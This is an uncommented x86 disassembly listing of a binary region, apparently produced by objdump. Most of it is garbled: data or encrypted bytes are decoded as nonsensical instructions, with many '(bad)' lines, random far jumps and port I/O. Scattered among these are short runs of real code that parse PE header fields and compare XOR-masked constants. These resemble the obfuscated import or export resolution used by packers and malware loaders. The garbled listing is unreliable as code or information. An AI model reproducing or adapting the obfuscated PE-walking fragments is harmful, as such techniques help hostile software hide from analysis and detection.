  408d85:	push   0xffffffab
  408d87:	pop    ds
  408d88:	jl     0x408dad
  408d8a:	rcl    BYTE PTR [esi+0x20],1
  408d8d:	push   esi
  408d8e:	fcomp  QWORD PTR [ebx+0x2a66dcbb]
  408d94:	hlt    
  408d95:	lods   al,BYTE PTR ds:[esi]
  408d96:	and    ebx,DWORD PTR [ecx-0xd]
  408d99:	rol    DWORD PTR ds:0x488ea0dd,1
  408d9f:	mov    cl,0x3d
  408da1:	xor    esp,DWORD PTR [eax]
  408da3:	xchg   ebp,eax
  408da4:	pop    esp
  408da5:	dec    esp
  408da6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408da7:	neg    BYTE PTR [ebp+0x28]
  408daa:	fstp   TBYTE PTR [ebx-0x62]
  408dad:	inc    edx
  408dae:	or     dl,BYTE PTR cs:[edi+eiz*2-0x12]
  408db3:	and    DWORD PTR [ecx],eax
  408db5:	sbb    al,0xbd
  408db7:	(bad)  
  408db8:	push   ebx
  408db9:	mov    ecx,ebx
  408dbb:	clc    
  408dbc:	ret    
  408dbd:	daa    
  408dbe:	push   edx
  408dbf:	cmp    eax,0xa6cdea65
  408dc4:	bound  esi,QWORD PTR [ebp-0x2fc6682a]
  408dca:	dec    eax
  408dcb:	cs jmp 0xa44b:0xe432f9fd
  408dd3:	mov    esp,0x1af0d620
  408dd8:	pusha  
  408dd9:	ja     0x408e06
  408ddb:	mov    ebx,DWORD PTR [edx+0x23]
  408dde:	sub    al,0x8c
  408de0:	pop    edi
  408de1:	xor    ah,dh
  408de3:	pop    ebp
  408de4:	push   ecx
  408de5:	inc    edx
  408de6:	adc    eax,0x52fb889c
  408deb:	mov    ds:0xfe8b577d,al
  408df0:	or     al,0x4a
  408df2:	mov    gs,WORD PTR [eax-0x9e610b9]
  408df8:	rol    BYTE PTR [eax-0x935548c],1
  408dfe:	sar    BYTE PTR [eax],0xd7
  408e01:	std    
  408e02:	cmp    bl,BYTE PTR [ecx-0x3ab13b09]
  408e08:	stc    
  408e09:	sbb    al,0xac
  408e0b:	out    dx,al
  408e0c:	dec    esi
  408e0d:	(bad)  
  408e0e:	xor    bh,dh
  408e10:	push   edi
  408e11:	les    eax,FWORD PTR [edx-0x72]
  408e14:	fisubr WORD PTR [ecx]
  408e16:	jo     0x408dd1
  408e18:	push   ebp
  408e19:	sbb    DWORD PTR [edx+0x10],edi
  408e1c:	inc    ebp
  408e1d:	loop   0x408e3d
  408e1f:	pop    esp
  408e20:	cmp    DWORD PTR [ebx],esp
  408e22:	xchg   ecx,eax
  408e23:	retf   
  408e24:	add    DWORD PTR [eax],esi
  408e26:	mov    ax,WORD PTR [ebp-0x4]
  408e2a:	movzx  eax,ax
  408e2d:	sub    ecx,edi
  408e2f:	cmp    eax,ecx
  408e31:	mov    eax,DWORD PTR [ebp+0x10]
  408e34:	movzx  ecx,WORD PTR [ebp-0x4]
  408e38:	jg     0x408e4d
  408e3e:	xor    eax,esi
  408e40:	sub    ecx,eax
  408e42:	sub    ecx,edi
  408e44:	mov    WORD PTR [ebp-0x4],cx
  408e48:	jmp    0x408e5a
  408e4d:	xor    eax,esi
  408e4f:	lea    eax,[eax+ecx*1+0x32729b]
  408e56:	mov    WORD PTR [ebp-0x4],ax
  408e5a:	mov    eax,DWORD PTR [ebp-0xc]
  408e5d:	cmp    eax,ebx
  408e5f:	je     0x408e73
  408e65:	mov    eax,DWORD PTR [ebp-0x8]
  408e68:	mov    DWORD PTR [eax],0x60341e89
  408e6e:	jmp    0x409836
  408e73:	mov    eax,DWORD PTR [ebp+0x8]
  408e76:	mov    ecx,DWORD PTR [ebp-0x8]
  408e79:	xor    eax,esi
  408e7b:	add    eax,edi
  408e7d:	cmp    DWORD PTR [ecx],eax
  408e7f:	je     0x409149
  408e85:	mov    ecx,DWORD PTR [ebp-0x14]
  408e88:	mov    eax,DWORD PTR [ebp-0x8]
  408e8b:	mov    eax,DWORD PTR [eax]
  408e8d:	mov    eax,DWORD PTR [eax+0x3c]
  408e90:	lea    ecx,[ecx*8+0x78]
  408e97:	add    eax,ecx
  408e99:	mov    ecx,DWORD PTR [ebp-0x8]
  408e9c:	mov    ecx,DWORD PTR [ecx]
  408e9e:	mov    eax,DWORD PTR [eax+ecx*1]
  408ea1:	mov    DWORD PTR [ebp-0x1c],eax
  408ea4:	mov    eax,DWORD PTR [ebp+0x8]
  408ea7:	jmp    0x4090ee
  408eac:	sbb    al,0x56
  408eae:	aam    0xcf
  408eb0:	je     0x408eff
  408eb2:	and    eax,0xfc4f2b75
  408eb7:	adc    eax,0x19871aaa
  408ebc:	or     al,0xd1
  408ebe:	jle    0x408f3e
  408ec0:	and    al,0x7c
  408ec2:	jle    0x408f42
  408ec4:	mov    dl,0x2c
  408ec6:	jmp    0x408f24
  408ec8:	loopne 0x408eca
  408eca:	and    cl,ah
  408ecc:	test   eax,0x663540ee
  408ed1:	or     eax,0xa5acb4c0
  408ed6:	jns    0x408ed1
  408ed8:	sahf   
  408ed9:	pop    ebx
  408eda:	pushf  
  408edb:	jno    0x408ee7
  408edd:	imul   esp,ebx,0x60
  408ee0:	add    al,0x92
  408ee2:	and    BYTE PTR [ebx-0x33],cl
  408ee5:	mov    dh,0x4
  408ee7:	into   
  408ee8:	and    DWORD PTR [eax-0x51],esi
  408eeb:	test   DWORD PTR [eax-0x68],esi
  408eee:	sub    dl,BYTE PTR [eax]
  408ef0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ef1:	test   cl,0xcb
  408ef4:	mov    WORD PTR [ecx],?
  408ef6:	rcr    ah,cl
  408ef8:	sub    esp,DWORD PTR [ecx]
  408efa:	bnd jb 0x408f63
  408efd:	ins    BYTE PTR es:[edi],dx
  408efe:	into   
  408eff:	mov    ecx,0xe67b3a2f
  408f04:	in     al,0xca
  408f06:	outs   dx,DWORD PTR ds:[esi]
  408f07:	retf   0x8899
  408f0a:	stc    
  408f0b:	test   eax,ebx
  408f0d:	aas    
  408f0e:	fld    QWORD PTR [ebx+ecx*1]
  408f11:	scas   al,BYTE PTR es:[edi]
  408f12:	xchg   esp,eax
  408f13:	mov    eax,0x786cfdb3
  408f18:	ja     0x408f4a
  408f1a:	aad    0xb8
  408f1c:	or     BYTE PTR [edi+ecx*1-0x515eb1e7],bh
  408f23:	sub    dh,BYTE PTR fs:[ecx+0x12214c3c]
  408f2a:	ja     0x408f89
  408f2c:	add    dh,BYTE PTR [esi+0x4382d04c]
  408f32:	sti    
  408f33:	outs   dx,DWORD PTR ds:[esi]
  408f34:	imul   esi,DWORD PTR [eax-0x6c],0x81bb7695
  408f3b:	inc    eax
  408f3d:	aaa    
  408f3e:	scas   eax,DWORD PTR es:[edi]
  408f3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f40:	dec    eax
  408f41:	das    
  408f42:	repnz pop esp
  408f44:	dec    ebp
  408f45:	jl     0x408f98
  408f47:	mov    esp,0x4a3c59e
  408f4c:	xchg   ebx,eax
  408f4d:	mov    cl,0x61
  408f4f:	pusha  
  408f50:	pop    es
  408f51:	cwde   
  408f52:	mov    al,0x3e
  408f54:	rol    DWORD PTR [edi-0x45],0x5f
  408f58:	sahf   
  408f59:	xlat   BYTE PTR ds:[ebx]
  408f5a:	js     0x408f01
  408f5c:	inc    esi
  408f5d:	inc    ebx
  408f5e:	push   es
  408f5f:	sub    edx,edi
  408f61:	ror    BYTE PTR [edx-0x3ccf855b],0x26
  408f68:	fs jmp 0x9b47f06a
  408f6e:	dec    DWORD PTR [ecx+ebp*1-0xe]
  408f72:	push   0x7a19efdb
  408f77:	push   esi
  408f78:	enter  0xb69e,0xbf
  408f7c:	sub    eax,0x27704236
  408f81:	ins    DWORD PTR es:[edi],dx
  408f82:	mov    al,0x3f
  408f84:	out    dx,al
  408f85:	test   dh,cl
  408f87:	out    dx,eax
  408f88:	shl    BYTE PTR [ebx],cl
  408f8a:	dec    ebx
  408f8b:	xchg   esi,ebp
  408f8d:	mul    BYTE PTR [eax-0x58e2f02b]
  408f93:	push   ecx
  408f94:	xchg   DWORD PTR [eax+0x48],ebx
  408f97:	inc    edi
  408f98:	(bad)  
  408f99:	jg     0x408f9d
  408f9b:	cmp    ebp,DWORD PTR [eax+0x19]
  408f9e:	xchg   ecx,eax
  408f9f:	test   al,ch
  408fa1:	push   es
  408fa2:	std    
  408fa3:	out    0x57,al
  408fa5:	sbb    eax,edx
  408fa7:	imul   ebp,DWORD PTR [ecx],0xffffffb6
  408faa:	dec    edi
  408fab:	popf   
  408fac:	pop    ebx
  408fad:	loopne 0x408fd5
  408faf:	out    dx,al
  408fb0:	fwait
  408fb1:	and    eax,0x1889c9c4
  408fb6:	(bad)  
  408fb7:	jmp    0x89c08324
  408fbc:	ins    DWORD PTR es:[edi],dx
  408fbd:	mov    ds:0xa9704fdc,eax
  408fc2:	ror    DWORD PTR [edi+0x11],0xb3
  408fc6:	mov    WORD PTR [ebx],es
  408fc8:	repnz xchg esi,eax
  408fca:	xor    BYTE PTR [esp+ebx*8-0x37ebeec],cl
  408fd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fd2:	jae    0x408fee
  408fd4:	inc    edx
  408fd5:	jle    0x408f97
  408fd7:	cmp    eax,0x27b33f17
  408fdc:	out    dx,eax
  408fdd:	xor    eax,0xd7d72ede
  408fe2:	adc    al,cl
  408fe4:	xlat   BYTE PTR ds:[ebx]
  408fe5:	mov    al,BYTE PTR [ecx-0x4a01dd3]
  408feb:	and    eax,0x5f3ecab0
  408ff0:	sbb    al,ah
  408ff2:	fadd   QWORD PTR [eax-0x56]
  408ff5:	inc    ebp
  408ff6:	loopne 0x409033
  408ff8:	push   edi
  408ff9:	jne    0x408f86
  408ffb:	inc    ecx
  408ffc:	xchg   ebx,eax
  408ffd:	cmp    dl,BYTE PTR [esi+ebp*1-0x4f]
  409001:	and    al,BYTE PTR [edi]
  409003:	in     al,0x5d
  409005:	sub    eax,0x9fb6c4a9
  40900a:	cli    
  40900b:	xlat   BYTE PTR ds:[ebx]
  40900c:	pop    edi
  40900d:	shl    BYTE PTR [eax+0x7c],0xde
  409011:	repnz mov cl,0x5c
  409014:	mov    esp,0xa6d61945
  409019:	sbb    al,0x54
  40901b:	dec    edi
  40901c:	rol    DWORD PTR [esi+edx*2-0x3c0cd57d],0x5e
  409024:	push   edx
  409025:	inc    esi
  409026:	mov    WORD PTR [eax+edx*2-0x50c67720],ss
  40902d:	out    0xda,al
  40902f:	xchg   edx,eax
  409030:	scas   al,BYTE PTR es:[edi]
  409031:	cmp    al,0x4c
  409033:	inc    ecx
  409034:	ss call 0xdda:0xb448c10
  40903c:	ja     0x40901a
  40903e:	pop    es
  40903f:	cmp    eax,0x7e0a3745
  409044:	mov    ch,0xb5
  409046:	repnz pop ecx
  409048:	dec    eax
  409049:	mov    ds:0x244ad9e3,eax
  40904e:	out    0x81,al
  409050:	inc    edx
  409051:	mov    bh,0xa8
  409053:	lahf   
  409054:	popa   
  409055:	data16 std 
  409057:	push   esp
  409058:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409059:	sahf   
  40905a:	pop    edi
  40905b:	push   esp
  40905c:	xchg   ebx,eax
  40905d:	cwde   
  40905e:	gs ss ja 0x4090ad
  409062:	adc    ecx,ecx
  409064:	inc    edx
  409065:	pop    esi
  409066:	out    dx,eax
  409067:	outs   dx,DWORD PTR ds:[esi]
  409068:	nop
  409069:	scas   eax,DWORD PTR es:[edi]
  40906a:	retf   0xfc33
  40906d:	in     eax,dx
  40906e:	hlt    
  40906f:	sub    ecx,DWORD PTR [ebx]
  409071:	fisub  DWORD PTR [eax-0x2b]
  409074:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409075:	sub    dl,bh
  409077:	inc    eax
  409078:	dec    edx
  409079:	pop    eax
  40907a:	outs   dx,BYTE PTR ds:[esi]
  40907b:	push   0x5d
  40907d:	mov    al,BYTE PTR [ebx]
  40907f:	loope  0x409032
  409081:	add    bh,BYTE PTR [ebx-0x6e]
  409084:	mov    BYTE PTR [ecx+0x376d4330],cl
  40908a:	hlt    
  40908b:	(bad)  
  40908c:	stos   DWORD PTR es:[edi],eax
  40908d:	loop   0x4090bc
  40908f:	gs xchg esi,eax
  409091:	dec    edx
  409092:	not    edi
  409094:	push   cs
  409095:	les    edi,FWORD PTR [ebx]
  409097:	dec    edi
  409098:	rcr    BYTE PTR [ebx],1
  40909a:	xor    eax,0x7b507ad
  40909f:	loop   0x409088
  4090a1:	mov    ecx,DWORD PTR [esp+ecx*8]
  4090a4:	in     eax,dx
  4090a5:	mov    ah,0xaf
  4090a7:	jns    0x409094
  4090a9:	jle    0x4090b7
  4090ab:	cmp    esp,DWORD PTR [edi+0x2455bdb0]
  4090b1:	cs out 0x8f,eax
  4090b4:	int    0x24
  4090b6:	mov    dh,0xa
  4090b8:	jmp    0xd846e3e4
  4090bd:	inc    ebp
  4090be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090bf:	cmc    
  4090c0:	clc    
  4090c1:	sar    BYTE PTR [edx-0x35],1
  4090c4:	ins    DWORD PTR es:[edi],dx
  4090c5:	and    ch,BYTE PTR [esi-0x1c6c4acd]
  4090cb:	(bad)  
  4090cc:	shl    BYTE PTR [ebp-0x2d58c0fc],cl
  4090d2:	adc    edx,DWORD PTR [ebx]
  4090d4:	mov    bl,0xe4
  4090d6:	adc    al,0x3b
  4090d8:	ins    DWORD PTR es:[edi],dx
  4090d9:	and    eax,0x4367d7d
  4090de:	xor    BYTE PTR ds:0xf0c86a7d,dl
  4090e4:	jmp    0x4090f1
  4090e6:	aad    0xc9
  4090e8:	mov    esi,0xdcdbc8ff
  4090ed:	and    al,0x33
  4090ef:	mov    BYTE PTR [ebx],0xc7
  4090f2:	mov    DWORD PTR [ebp-0x20],eax
  4090f5:	mov    eax,DWORD PTR [ebp+0x8]
  4090f8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4090fb:	xor    eax,esi
  4090fd:	add    eax,edi
  4090ff:	cmp    ecx,eax
  409101:	je     0x409836
  409107:	mov    eax,DWORD PTR [ebp-0x8]
  40910a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40910d:	add    ecx,DWORD PTR [eax]
  40910f:	mov    DWORD PTR [ebp-0x20],ecx
  409112:	mov    eax,DWORD PTR [ebp-0x20]
  409115:	mov    ecx,DWORD PTR [ebp-0x8]
  409118:	mov    eax,DWORD PTR [eax+0xc]
  40911b:	mov    ecx,DWORD PTR [ecx]
  40911d:	mov    al,BYTE PTR [eax+ecx*1]
  409120:	add    al,0x38
  409122:	xor    al,0x46
  409124:	cmp    al,0xc5
  409126:	je     0x40913d
  40912c:	mov    eax,DWORD PTR [ebp+0x8]
  40912f:	mov    ecx,DWORD PTR [ebp-0x8]
  409132:	xor    eax,esi
  409134:	add    eax,edi
  409136:	mov    DWORD PTR [ecx],eax
  409138:	jmp    0x409836
  40913d:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  409144:	jmp    0x409836
  409149:	mov    eax,DWORD PTR [ebp-0x8]
  40914c:	mov    ecx,DWORD PTR [ebp-0x18]
  40914f:	mov    ecx,DWORD PTR [ecx]
  409151:	jmp    0x409398
  409156:	sbb    eax,0xe1aec100
  40915b:	outs   dx,DWORD PTR ds:[esi]
  40915c:	jno    0x4090ef
  40915e:	out    dx,al
  40915f:	jne    0x4090f6
  409161:	mov    bh,0xee
  409163:	inc    esi
  409164:	jae    0x4091b7
  409166:	xor    bl,bh
  409168:	jle    0x4091e8
  40916a:	and    al,0x7c
  40916c:	jle    0x4091ec
  40916e:	outs   dx,BYTE PTR ds:[esi]
  40916f:	xchg   esi,eax
  409170:	cmp    eax,0x46f29382
  409175:	(bad)  
  409176:	or     eax,0x861ae8a1
  40917b:	xor    BYTE PTR [edi],ah
  40917d:	add    eax,edx
  40917f:	mov    dl,0x32
  409181:	(bad)  [ebx+0x17]
  409184:	xchg   esi,eax
  409185:	sub    BYTE PTR [ecx-0x7dc127ce],bl
  40918b:	stos   BYTE PTR es:[edi],al
  40918c:	popf   
  40918d:	and    al,0x8f
  40918f:	push   ebp
  409190:	repnz pop eax
  409192:	out    dx,al
  409193:	xor    dh,bh
  409195:	dec    edx
  409196:	retf   
  409197:	dec    edi
  409198:	aam    0xe1
  40919a:	jbe    0x409134
  40919c:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40919e:	push   ds
  40919f:	add    al,0x36
  4091a1:	push   es
  4091a2:	lods   ax,WORD PTR ds:[esi]
  4091a4:	jle    0x4091eb
  4091a6:	fisttp DWORD PTR [edx]
  4091a8:	push   ss
  4091a9:	pop    ecx
  4091aa:	jge    0x409144
  4091ac:	jnp    0x40920a
  4091ae:	leave  
  4091af:	inc    edi
  4091b0:	pusha  
  4091b1:	faddp  st(5),st
  4091b3:	nop
  4091b4:	out    0xec,al
  4091b6:	inc    ebp
  4091b7:	in     al,0x8d
  4091b9:	dec    esi
  4091ba:	(bad)  
  4091bc:	jl     0x4091a0
  4091be:	jmp    0x40919b
  4091c0:	push   ecx
  4091c1:	daa    
  4091c2:	sbb    edx,ebx
  4091c4:	into   
  4091c5:	dec    ebx
  4091c6:	sub    DWORD PTR [edi-0x65],edi
  4091c9:	mov    ah,0xfd
  4091cb:	icebp  
  4091cc:	scas   eax,DWORD PTR es:[edi]
  4091cd:	jle    0x409170
  4091cf:	fstp   DWORD PTR [ebp+0x2]
  4091d2:	out    0x3d,eax
  4091d4:	enter  0x3d0,0xc7
  4091d8:	rcr    DWORD PTR [esi+0x6],cl
  4091db:	hlt    
  4091dc:	mov    ch,0xaf
  4091de:	inc    edi
  4091df:	or     ecx,edi
  4091e1:	retf   0x2f9d
  4091e4:	push   esp
  4091e5:	pop    ebx
  4091e6:	call   FWORD PTR [ebp+edi*1-0x7423e85e]
  4091ed:	pop    ecx
  4091ee:	repz jb 0x409214
  4091f1:	jo     0x4091f6
  4091f3:	nop
  4091f4:	es and esi,0xffffffee
  4091f8:	cwde   
  4091f9:	daa    
  4091fa:	aas    
  4091fb:	addr16 cld 
  4091fd:	push   eax
  4091fe:	adc    ch,BYTE PTR [ebx]
  409200:	adc    BYTE PTR [esp+ecx*1],dl
  409203:	sub    eax,DWORD PTR ds:0xec871f7d
  409209:	jne    0x4091e4
  40920b:	mov    WORD PTR [ebx+edx*1],ds
  40920e:	or     BYTE PTR [esi-0x7b],ah
  409211:	jo     0x409259
  409213:	sbb    dl,dh
  409215:	daa    
  409216:	dec    edx
  409217:	mov    esp,DWORD PTR [ecx]
  409219:	pop    esp
  40921a:	lock sub ebp,DWORD PTR [ecx+0x7]
  40921e:	bound  ebp,QWORD PTR [ebx-0x557da868]
  409224:	loopne 0x4091de
  409226:	mov    ?,WORD PTR [esi+0x73133cb1]
  40922c:	mov    al,ds:0x8062e23a
  409231:	xchg   esp,eax
  409232:	mov    ah,0xdb
  409234:	es xchg edi,eax
  409236:	dec    ebx
  409237:	cmp    eax,0x79565e0e
  40923c:	enter  0x2474,0xd0
  409240:	jmp    0x3837:0x2082a64d
  409247:	push   esi
  409248:	cwde   
  409249:	jbe    0x409289
  40924b:	jl     0x409201
  40924d:	sbb    DWORD PTR [ecx+0x2b],ecx
  409250:	fnsave [eax+0x5f]
  409253:	daa    
  409254:	int    0x74
  409256:	fs sub eax,0xce755c22
  40925c:	fs mov eax,0x46e6dde3
  409262:	clc    
  409263:	rcr    BYTE PTR [edx+0x25],1
  409266:	das    
  409267:	cld    
  409268:	(bad)  
  409269:	mov    ecx,0xd1c531ec
  40926e:	out    dx,eax
  40926f:	es ss in eax,0xb2
  409273:	mov    ?,WORD PTR [esi+eax*8]
  409276:	std    
  409277:	int3   
  409278:	rcl    BYTE PTR [esi+esi*4+0x41],0xea
  40927d:	xchg   edx,eax
  40927e:	and    ecx,DWORD PTR [eax]
  409280:	mov    al,ds:0x15eb9627
  409285:	outs   dx,BYTE PTR ds:[esi]
  409286:	xor    DWORD PTR [ecx-0xf1f11be],ecx
  40928c:	xor    ecx,DWORD PTR [ebp-0x49]
  40928f:	icebp  
  409290:	pop    es
  409291:	sbb    bl,BYTE PTR [esi+0x5c]
  409294:	push   esp
  409295:	sbb    esp,ecx
  409297:	jnp    0x4092a6
  409299:	sbb    BYTE PTR cs:[edx],0x36
  40929d:	test   eax,0x1dc64ae4
  4092a2:	xor    dh,cl
  4092a4:	xor    ch,BYTE PTR [esp+esi*4-0x1cd9646e]
  4092ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092ac:	(bad)  
  4092ad:	mov    ds:0xeb6bb4d4,eax
  4092b2:	test   eax,0x8eb6210e
  4092b7:	sti    
  4092b8:	xor    ah,cl
  4092ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092bb:	les    eax,FWORD PTR [esi+0x44a39c39]
  4092c1:	data16 stos BYTE PTR es:[edi],al
  4092c3:	jmp    0x4092b2
  4092c5:	mov    esi,0x9047e829
  4092ca:	call   0x568373bd
  4092cf:	rcl    bh,cl
  4092d1:	push   eax
  4092d2:	jle    0x409342
  4092d4:	call   0x9800:0x876d09f
  4092db:	and    bh,dl
  4092dd:	rcr    BYTE PTR [ebx+edi*1+0x28e7a998],cl
  4092e4:	and    BYTE PTR [ebx+0x34],dh
  4092e7:	xor    ecx,edx
  4092e9:	xchg   ebx,eax
  4092ea:	mov    al,0x52
  4092ec:	jle    0x40927e
  4092ee:	xchg   BYTE PTR [eax],bh
  4092f0:	pop    eax
  4092f1:	pop    edx
  4092f2:	out    0x79,eax
  4092f4:	and    dl,cl
  4092f6:	sub    eax,0x4cb1856a
  4092fb:	fst    st(4)
  4092fd:	sub    DWORD PTR [edx+0x3f79ff42],edx
  409303:	mov    ah,0xbe
  409305:	jb     0x409385
  409307:	addr16 xchg edi,eax
  409309:	jbe    0x409337
  40930b:	push   0xffffffdc
  40930d:	dec    esp
  40930e:	outs   dx,DWORD PTR ds:[esi]
  40930f:	xor    BYTE PTR [ebx+0x29],al
  409312:	push   cs
  409313:	sar    BYTE PTR [esi-0x3dbbf66d],0x52
  40931a:	add    bl,bl
  40931c:	pop    ebp
  40931d:	leave  
  40931e:	lock loopne 0x409365
  409321:	stos   BYTE PTR es:[edi],al
  409322:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409323:	dec    ebx
  409324:	icebp  
  409325:	sbb    BYTE PTR [edi-0x5744c417],0x62
  40932c:	mov    ds:0xb94f836d,eax
  409331:	in     al,dx
  409332:	jno    0x4092e2
  409334:	inc    ebx
  409335:	mov    bl,cl
  409337:	push   ds
  409338:	add    DWORD PTR [edi+edx*1+0x1],ecx
  40933c:	ja     0x409364
  40933e:	inc    esp
  40933f:	add    BYTE PTR [edi+0x3c],0x52
  409343:	rol    DWORD PTR [edx-0x50],0x68
  409347:	fs lahf 
  409349:	out    dx,eax
  40934a:	xchg   DWORD PTR [edx],eax
  40934c:	rcr    al,0xd9
  40934f:	mov    bh,0x5a
  409351:	cmp    DWORD PTR [ecx-0x5a290526],eax
  409357:	mov    esp,0x3747ad7c
  40935c:	xor    ebp,DWORD PTR [edx-0x3f21c0d1]
  409362:	jl     0x40939b
  409364:	cmp    eax,0x2a5bcde9
  409369:	test   DWORD PTR [ecx+eax*2-0x8],esp
  40936d:	push   esp
  40936e:	sub    ebx,DWORD PTR [edi]
  409370:	or     esi,0xffffffd9
  409373:	pop    ecx
  409374:	xor    bh,ch
  409376:	les    edi,FWORD PTR [esi+0x7cf82b9a]
  40937c:	aam    0x93
  40937e:	into   
  40937f:	daa    
  409380:	rol    DWORD PTR [eax-0x48],0x8c
  409384:	popf   
  409385:	or     BYTE PTR [ecx+esi*1],bl
  409388:	jmp    0x3c1f08fb
  40938d:	pop    ss
  40938e:	mov    dh,BYTE PTR [ebp+0x4e]
  409391:	iret   
  409392:	test   eax,0xec63e226
  409397:	adc    ecx,DWORD PTR [ecx+0xc458b08]
  40939d:	mov    eax,DWORD PTR [ebp+0x8]
  4093a0:	push   DWORD PTR [ebp-0x8]
  4093a3:	jmp    0x4095ea
  4093a8:	lods   eax,DWORD PTR ds:[esi]
  4093a9:	mov    dl,0xfe
  4093ab:	outs   dx,BYTE PTR ds:[esi]
  4093ac:	xor    DWORD PTR [edx+0x6d],0x15d7aa71
  4093b3:	pop    edi
  4093b4:	leave  
  4093b5:	mov    ebx,0xddd8948e
  4093ba:	jle    0x40943a
  4093bc:	and    al,0x7c
  4093be:	jle    0x40943e
  4093c0:	std    
  4093c1:	xlat   BYTE PTR ds:[ebx]
  4093c2:	or     edx,DWORD PTR [esi+0x31]
  4093c5:	cmc    
  4093c6:	aaa    
  4093c7:	pop    edx
  4093c8:	push   edi
  4093c9:	xchg   edi,eax
  4093ca:	mul    DWORD PTR [edi]
  4093cc:	xchg   ebx,eax
  4093cd:	or     al,0x45
  4093cf:	sbb    edx,DWORD PTR [esi-0x51]
  4093d2:	outs   dx,DWORD PTR ds:[esi]
  4093d3:	inc    ecx
  4093d4:	sub    ah,dh
  4093d6:	pop    ebp
  4093d7:	(bad)  
  4093d8:	ss xchg edi,eax
  4093da:	aas    
  4093db:	test   BYTE PTR [edx],al
  4093dd:	inc    eax
  4093de:	push   es
  4093df:	std    
  4093e0:	pop    ebx
  4093e1:	jg     0x40940f
  4093e3:	shl    DWORD PTR [ecx],cl
  4093e5:	mov    esi,0x1b8c040f
  4093ea:	lods   eax,DWORD PTR ds:[esi]
  4093eb:	es dec ebx
  4093ed:	lea    ecx,[esi-0x4195520d]
  4093f3:	cmp    ebp,DWORD PTR [edi]
  4093f5:	popa   
  4093f6:	in     al,0x7f
  4093f8:	mov    ah,0x99
  4093fa:	mov    ch,0x70
  4093fc:	fimul  WORD PTR [edx+0x21660c24]
  409402:	cmp    al,0xaf
  409404:	inc    ecx
  409405:	adc    eax,0x4f9b8509
  40940a:	fsub   DWORD PTR [edi-0x69]
  40940d:	cmp    eax,0x7ff8d292
  409412:	jns    0x40947c
  409414:	gs mov bh,0x74
  409417:	(bad)  
  409418:	push   ecx
  409419:	adc    esp,DWORD PTR [ecx+0xb44f2a5]
  40941f:	(bad)  
  409420:	ss inc dx
  409423:	std    
  409424:	fs pop ebp
  409426:	xchg   ebp,eax
  409427:	into   
  409428:	add    ah,BYTE PTR ds:0x5778c184
  40942e:	jecxz  0x40948c
  409430:	pop    ds
  409431:	and    BYTE PTR [ebx-0x71096f9a],bl
  409437:	(bad)  
  409438:	xor    eax,0x6900871c
  40943d:	push   ss
  40943e:	imul   eax,edx,0x293bda12
  409444:	imul   DWORD PTR [eax-0x80]
  409447:	int3   
  409448:	cmp    esi,DWORD PTR [ebx]
  40944a:	add    al,0x99
  40944c:	push   0xffffffa9
  40944e:	and    ebx,DWORD PTR [eax]
  409450:	int3   
  409451:	cdq    
  409452:	mov    ch,0x2f
  409454:	mov    esi,0x3a01b2ae
  409459:	add    dl,BYTE PTR [esi-0x15]
  40945c:	cwde   
  40945d:	push   esi
  40945e:	xchg   ch,cl
  409460:	pop    esp
  409461:	xchg   ch,bl
  409463:	dec    esp
  409464:	ss adc eax,0xaf22c0a9
  40946a:	pushf  
  40946b:	adc    eax,DWORD PTR ds:[ebp-0xce72ba7]
  409472:	sub    eax,0x47e3aab5
  409477:	xchg   ebp,eax
  409478:	jns    0x40948c
  40947a:	aas    
  40947b:	cmp    eax,0xe3dc3033
  409480:	hlt    
  409481:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409482:	pop    esi
  409483:	mov    bl,0x85
  409485:	jbe    0x4094f8
  409487:	sbb    BYTE PTR [ebx+eax*8-0x2021868e],0x6
  40948f:	jle    0x409503
  409491:	push   0xffffffbe
  409493:	sub    ah,bh
  409495:	(bad)  
  409496:	fcom   st(5)
  409498:	(bad)  
  409499:	fisubr WORD PTR [ebx-0x4e0be2fd]
  40949f:	mov    bl,0x31
  4094a1:	outs   dx,BYTE PTR ds:[esi]
  4094a2:	shl    BYTE PTR [ebp+0x325109ba],1
  4094a8:	sti    
  4094a9:	ret    
  4094aa:	jl     0x409459
  4094ac:	jo     0x4094ea
  4094ae:	xor    BYTE PTR [edx+0x4e],dl
  4094b1:	neg    BYTE PTR [edx+eiz*1]
  4094b4:	or     DWORD PTR ss:[ebp-0x1e],ebx
  4094b8:	stos   DWORD PTR es:[edi],eax
  4094b9:	js     0x4094ad
  4094bb:	pop    ecx
  4094bc:	mov    al,0x6c
  4094be:	mov    BYTE PTR [ebp+0x12],0x3c
  4094c2:	jge    0x40944e
  4094c4:	jns    0x4094f2
  4094c6:	push   esp
  4094c7:	aas    
  4094c8:	xchg   esi,eax
  4094c9:	xchg   ebx,eax
  4094ca:	mov    edx,0x75134532
  4094cf:	rol    DWORD PTR [ecx-0x11b479be],1
  4094d5:	fcomp  DWORD PTR [edx]
  4094d7:	pop    eax
  4094d8:	in     al,0x63
  4094da:	mov    ch,0x98
  4094dc:	dec    eax
  4094dd:	ret    0x2f2c
  4094e0:	and    BYTE PTR [esi+0x33],bh
  4094e3:	or     al,0x46
  4094e5:	xlat   BYTE PTR ds:[ebx]
  4094e6:	jns    0x409473
  4094e8:	add    DWORD PTR [edx+0x1],esp
  4094eb:	mov    esi,DWORD PTR ss:[ebx+0xc]
  4094ef:	call   0xc25ea511
  4094f4:	pop    esi
  4094f5:	mov    ecx,0xde93ba15
  4094fa:	pop    es
  4094fb:	sub    bh,cl
  4094fd:	loope  0x4094ae
  4094ff:	pop    ebx
  409500:	pop    ds
  409501:	fsub   QWORD PTR [ebx+0x11]
  409504:	mov    WORD PTR [edi-0x4b48ad83],es
  40950a:	mov    eax,ds:0x3cad8508
  40950f:	jae    0x4094a6
  409511:	adc    eax,0xb5da81e2
